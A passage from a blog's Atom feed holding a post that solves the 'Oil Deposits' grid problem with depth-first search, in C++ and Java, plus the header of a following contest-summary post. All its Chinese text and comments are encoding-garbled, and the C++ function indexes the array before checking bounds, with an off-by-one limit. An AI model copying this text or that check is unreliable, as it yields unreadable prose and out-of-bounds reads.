      <category term="ÊàëÊòØËèúÈ∏°" scheme="http://www.yof3ng.xyz/tags/%E6%88%91%E6%98%AF%E8%8F%9C%E9%B8%A1/"/>
    
  </entry>
  
  <entry>
    <title>DFSÊ∑±Êêú_Oil_Deposits</title>
    <link href="http://www.yof3ng.xyz/2018/11/07/DFS%E6%B7%B1%E6%90%9C-Oil-Deposits/"/>
    <id>http://www.yof3ng.xyz/2018/11/07/DFSÊ∑±Êêú-Oil-Deposits/</id>
    <published>2018-11-07T14:26:26.000Z</published>
    <updated>2019-04-02T08:45:26.155Z</updated>
    
    <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="‰∏Ä‰∏™DFSÊ∞¥È¢òÔºàÂØπÊàëÊù•ËØ¥‰∏çÊ∞¥Ôºâ"><a href="#‰∏Ä‰∏™DFSÊ∞¥È¢òÔºàÂØπÊàëÊù•ËØ¥‰∏çÊ∞¥Ôºâ" class="headerlink" title="‰∏Ä‰∏™DFSÊ∞¥È¢òÔºàÂØπÊàëÊù•ËØ¥‰∏çÊ∞¥Ôºâ"></a>‰∏Ä‰∏™DFSÊ∞¥È¢òÔºàÂØπÊàëÊù•ËØ¥‰∏çÊ∞¥Ôºâ</h1><h2 id="Oil-Deposits"><a href="#Oil-Deposits" class="headerlink" title="Oil Deposits"></a>Oil Deposits</h2><pre class=" language-c++"><code class="language-c++">The GeoSurvComp geologic survey company is responsible for detecting underground oil deposits.GeoSurvComp works with one large rectangular region of land at a time, and creates a grid that dividesthe land into numerous square plots. It then analyzes each plot separately, using sensing equipment todetermine whether or not the plot contains oil.A plot containing oil is called a pocket. If two pockets are adjacent, then they are part of thesame oil deposit. Oil deposits can be quite large and may contain numerous pockets. Your job is todetermine how many different oil deposits are contained in a grid.InputThe input file contains one or more grids. Each grid begins with a line containing m and n, the numberof rows and columns in the grid, separated by a single space. If m = 0 it signals the end of the input;otherwise 1 ‚â§ m ‚â§ 100 and 1 ‚â§ n ‚â§ 100. Following this are m lines of n characters each (not countingthe end-of-line characters). Each character corresponds to one plot, and is either ‚Äò*‚Äô, representing theabsence of oil, or ‚Äò@‚Äô, representing an oil pocket.OutputFor each grid, output the number of distinct oil deposits. Two different pockets are part of the sameoil deposit if they are adjacent horizontally, vertically, or diagonally. An oil deposit will not containmore than 100 pockets.</code></pre><p>sample input:</p><pre class=" language-c++"><code class="language-c++">1 1*3 5*@*@***@***@*@*1 8@@****@*5 5 ****@*@@*@*@**@@@@*@@@**@0 0</code></pre><p>sample output:</p><pre class=" language-c++"><code class="language-c++">0122</code></pre><p>ÂºïÁî®‰∏Ä‰∏ãÁôæÂ∫¶ÁôæÁßëÔºö</p><blockquote><p>ËøôÈ¢òËÄÉÂØüÁöÑÊòØDFS(Depth First Search)Ôºö</p><p>Ê∑±Â∫¶‰ºòÂÖàÊêúÁ¥¢ÊòØ‰∏ÄÁßçÂú®ÂºÄÂèëÁà¨Ëô´Êó©Êúü‰ΩøÁî®ËæÉÂ§öÁöÑÊñπÊ≥ï„ÄÇÂÆÉÁöÑÁõÆÁöÑÊòØË¶ÅËææÂà∞Ë¢´ÊêúÁ¥¢ÁªìÊûÑÁöÑÂè∂ÁªìÁÇπ(Âç≥ÈÇ£‰∫õ‰∏çÂåÖÂê´‰ªª‰Ωï<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">Ë∂ÖÈìæ</a>ÁöÑ<a href="https://baike.baidu.com/item/HTML%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">HTMLÊñá‰ª∂</a>) „ÄÇÂú®‰∏Ä‰∏™HTMLÊñá‰ª∂‰∏≠ÔºåÂΩì‰∏Ä‰∏™<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">Ë∂ÖÈìæ</a>Ë¢´ÈÄâÊã©ÂêéÔºåË¢´ÈìæÊé•ÁöÑHTMLÊñá‰ª∂Â∞ÜÊâßË°åÊ∑±Â∫¶‰ºòÂÖàÊêúÁ¥¢ÔºåÂç≥Âú®ÊêúÁ¥¢ÂÖ∂‰ΩôÁöÑË∂ÖÈìæÁªìÊûú‰πãÂâçÂøÖÈ°ªÂÖàÂÆåÊï¥Âú∞ÊêúÁ¥¢ÂçïÁã¨ÁöÑ‰∏ÄÊù°Èìæ„ÄÇÊ∑±Â∫¶‰ºòÂÖàÊêúÁ¥¢Ê≤øÁùÄHTMLÊñá‰ª∂‰∏äÁöÑ<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">Ë∂ÖÈìæ</a>Ëµ∞Âà∞‰∏çËÉΩÂÜçÊ∑±ÂÖ•‰∏∫Ê≠¢ÔºåÁÑ∂ÂêéËøîÂõûÂà∞Êüê‰∏Ä‰∏™HTMLÊñá‰ª∂ÔºåÂÜçÁªßÁª≠ÈÄâÊã©ËØ•HTMLÊñá‰ª∂‰∏≠ÁöÑÂÖ∂‰ªñË∂ÖÈìæ„ÄÇÂΩì‰∏çÂÜçÊúâÂÖ∂‰ªñ<a href="https://baike.baidu.com/item/%E8%B6%85%E9%93%BE/3947966" target="_blank" rel="noopener">Ë∂ÖÈìæ</a>ÂèØÈÄâÊã©Êó∂ÔºåËØ¥ÊòéÊêúÁ¥¢Â∑≤ÁªèÁªìÊùü„ÄÇ</p></blockquote><blockquote><p>ÁªèÂ∏∏ÈÅáÂà∞ÁöÑ‰∏ç‰ªÖÊúâDFSÔºåËøòÊúâBFS(Breadth First Search):</p><p>ÂÆΩÂ∫¶‰ºòÂÖà<a href="https://baike.baidu.com/item/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/2988274" target="_blank" rel="noopener">ÊêúÁ¥¢ÁÆóÊ≥ï</a>ÔºàÂèàÁß∞ÂπøÂ∫¶‰ºòÂÖàÊêúÁ¥¢ÔºâÊòØÊúÄÁÆÄ‰æøÁöÑÂõæÁöÑÊêúÁ¥¢ÁÆóÊ≥ï‰πã‰∏ÄÔºåËøô‰∏ÄÁÆóÊ≥ï‰πüÊòØÂæàÂ§öÈáçË¶ÅÁöÑÂõæÁöÑÁÆóÊ≥ïÁöÑÂéüÂûã„ÄÇDijkstra<a href="https://baike.baidu.com/item/%E5%8D%95%E6%BA%90%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/6975204" target="_blank" rel="noopener">ÂçïÊ∫êÊúÄÁü≠Ë∑ØÂæÑ</a>ÁÆóÊ≥ïÂíåPrim<a href="https://baike.baidu.com/item/%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91" target="_blank" rel="noopener">ÊúÄÂ∞èÁîüÊàêÊ†ë</a>ÁÆóÊ≥ïÈÉΩÈááÁî®‰∫ÜÂíåÂÆΩÂ∫¶‰ºòÂÖàÊêúÁ¥¢Á±ª‰ººÁöÑÊÄùÊÉ≥„ÄÇÂÖ∂Âà´ÂêçÂèàÂè´BFSÔºåÂ±û‰∫é‰∏ÄÁßçÁõ≤ÁõÆÊêúÂØªÊ≥ïÔºåÁõÆÁöÑÊòØÁ≥ªÁªüÂú∞Â±ïÂºÄÂπ∂Ê£ÄÊü•Âõæ‰∏≠ÁöÑÊâÄÊúâËäÇÁÇπÔºå‰ª•ÊâæÂØªÁªìÊûú„ÄÇÊç¢Âè•ËØùËØ¥ÔºåÂÆÉÂπ∂‰∏çËÄÉËôëÁªìÊûúÁöÑÂèØËÉΩ‰ΩçÁΩÆÔºåÂΩªÂ∫ïÂú∞ÊêúÁ¥¢Êï¥Âº†ÂõæÔºåÁõ¥Âà∞ÊâæÂà∞ÁªìÊûú‰∏∫Ê≠¢„ÄÇ</p><p>BFSÂú®Ê±ÇËß£ÊúÄÁü≠Ë∑ØÂæÑÊàñËÄÖÊúÄÁü≠Ê≠•Êï∞‰∏äÊúâÂæàÂ§öÁöÑÂ∫îÁî®„ÄÇÂ∫îÁî®ÊúÄÂ§öÁöÑÊòØÂú®Ëµ∞Ëø∑ÂÆ´‰∏ä„ÄÇ</p></blockquote><p>Ê†πÊçÆÈ¢òÊÑèÔºåÊàë‰ª¨ÈúÄË¶ÅÂêëÂÖ´‰∏™ÊñπÂêëËøõË°åÊêúÁ¥¢ÔºåÂπ∂‰∏îËøõË°åÂà§Êñ≠</p><p>ÂèØ‰ª•Áî®c++ÂÜôÂá∫Ôºö</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ÂÆö‰πâÂÖ®Â±ÄÁöÑÔºåmÂíån</span><span class="token keyword">int</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//‰∏ªÂáΩÊï∞</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>flag<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//Êé•ÂèóÂ§öÁªÑÊï∞ÊçÆ</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>m<span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token operator">==</span><span class="token number">0</span> <span class="token operator">||</span> n<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                cin<span class="token operator">>></span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                    flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//ÂÆö‰πâÊ∑±Â∫¶‰ºòÂÖàÊêúÁ¥¢</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span><span class="token keyword">int</span> j<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//Ë∑ü‰∏™Êâ´Êèè‰ª™‰ººÁöÑÔºåÈÄíÂΩíÊêúÁ¥¢</span>    <span class="token comment" spellcheck="true">//Â¶ÇÊûú‰∏ç‰∏∫@ÊàñËÄÖË∂ÖÂá∫ËåÉÂõ¥ÔºåÂàôÂÅúÊ≠¢ËØ•ÊñπÂêëÊêúÁ¥¢</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'@'</span><span class="token operator">||</span>i<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>j<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>i<span class="token operator">></span>m<span class="token operator">||</span>j<span class="token operator">></span>n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//ÂêëÂÖ´‰∏™ÊñπÂêëËøõË°åÁªßÁª≠ÊêúÁ¥¢</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//Ê†πÊçÆdfsÁöÑÁâπÁÇπÔºåËÆøÈóÆËøáÁöÑÈ°∂ÁÇπÈúÄË¶ÅÊ†áËÆ∞(ËøôÈáåÁΩÆ‰∏∫*)ÔºåÈò≤Ê≠¢ÈáçÂ§çÈÄíÂΩíÁàÜÁÇ∏</span>        map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'*'</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token number">-1</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>javaÈáçÊûÑÁâà:</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>BufferedInputStream<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Scanner<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DFS_Oil_Deposits</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">char</span> map<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//Ê≥®ÊÑèËøôÈáåÂõ†‰∏∫ÊòØÂä®ÊÄÅÁî≥ËØ∑Êï∞ÁªÑÔºå‰∏éC++‰∏çÂêåÔºåÂ¶ÇÊûú‰∏çÂÖàÂà§Êñ≠Â•ΩÂèÇÊï∞Â§ßÂ∞èÔºå‰ºöÂØºËá¥Êï∞ÁªÑË∂äÁïåÁöÑÈóÆÈ¢ò</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> j <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span>i <span class="token operator">>=</span> m <span class="token operator">||</span> j <span class="token operator">>=</span> n <span class="token operator">||</span> map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//ÂêëÂÖ´‰∏™ÊñπÂêëËøõË°åÁªßÁª≠ÊêúÁ¥¢</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//Ê†πÊçÆdfsÁöÑÁâπÁÇπÔºåËÆøÈóÆËøáÁöÑÈ°∂ÁÇπÈúÄË¶ÅÊ†áËÆ∞(ËøôÈáåÁΩÆ‰∏∫*)ÔºåÈò≤Ê≠¢ÈáçÂ§çÈÄíÂΩíÁàÜÁÇ∏</span>            map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'*'</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dfs</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//ÂΩìÂÖÉÁ¥†ËøáÂ§öÊó†Ê≥ïÂàó‰∏æÊó∂ÔºåÂä®ÊÄÅÁî≥ËØ∑Êï∞ÁªÑ‰ª•‰∏ãÈù¢ËøôÁßçÊñπÂºè</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> flag1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Áî®ScannerÂÆö‰πâËæìÂÖ•</span>        Scanner cin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>System<span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Áõ∏ÂΩì‰∫éc++‰∏≠ÁöÑEOFÂà§Êñ≠</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>cin<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            flag1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> n <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                m <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                n <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> flag <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> flag<span class="token operator">++</span><span class="token punctuation">)</span>                    map<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">=</span> cin<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//                for (i = 0; i &lt; m; i++) {</span><span class="token comment" spellcheck="true">//                    for (j = 0; j &lt; n; j++) {</span><span class="token comment" spellcheck="true">//                        //map[i][j] = mapstrings[i][j];</span><span class="token comment" spellcheck="true">//                        System.out.print(map[i][j]);</span><span class="token comment" spellcheck="true">//                    }</span><span class="token comment" spellcheck="true">//                    System.out.print('\n');</span><span class="token comment" spellcheck="true">//                }</span><span class="token comment" spellcheck="true">//            }</span><span class="token comment" spellcheck="true">//</span><span class="token comment" spellcheck="true">//        }</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'@'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> map<span class="token punctuation">,</span> m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>                            flag1 <span class="token operator">=</span> flag1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>ÂÖ∂ÂÆûÊòØÈ°∫‰æøÁªÉ‰π†‰∏Ä‰∏ãjavaÔºåc++ÂíåjavaÊúâÊØîËæÉÂ§öÁõ∏‰ºº‰πãÂ§ÑÔºå‰ΩÜÊòØ‰πüÊúâ‰∏Ä‰∫õ‰∏çÂêåÁöÑÂú∞ÊñπÔºåÊâÄ‰ª•ÈúÄË¶ÅÂ•ΩÂ•ΩÊ≥®ÊÑè„ÄÇ</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;‚Ä¶‚Ä¶&lt;/p&gt;
    
    </summary>
    
      <category term="ÁÆóÊ≥ï" scheme="http://www.yof3ng.xyz/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="DFS" scheme="http://www.yof3ng.xyz/tags/DFS/"/>
    
      <category term="algorithm" scheme="http://www.yof3ng.xyz/tags/algorithm/"/>
    
      <category term="ÁÆóÊ≥ï" scheme="http://www.yof3ng.xyz/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="coding" scheme="http://www.yof3ng.xyz/tags/coding/"/>
    
  </entry>
  
  <entry>
    <title>Á¨¨ÂõõÂ±äÂÖ®ÂõΩÈÇÄËØ∑Ëµõ_ËµõÂêéÂ∞èÁªì</title>
    <link href="http://www.yof3ng.xyz/2018/11/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E4%B8%8A%E6%B5%B7%E7%BD%91%E5%AE%89%E6%9A%A8%E5%85%A8%E5%9B%BD%E9%82%80%E8%AF%B7%E8%B5%9B-%E8%B5%9B%E5%90%8E%E5%B0%8F%E7%BB%93/"/>
    <id>http://www.yof3ng.xyz/2018/11/06/Á¨¨ÂõõÂ±ä‰∏äÊµ∑ÁΩëÂÆâÊö®ÂÖ®ÂõΩÈÇÄËØ∑Ëµõ-ËµõÂêéÂ∞èÁªì/</id>
    <published>2018-11-06T02:32:35.000Z</published>
    <updated>2019-04-02T09:06:05.630Z</updated>
    
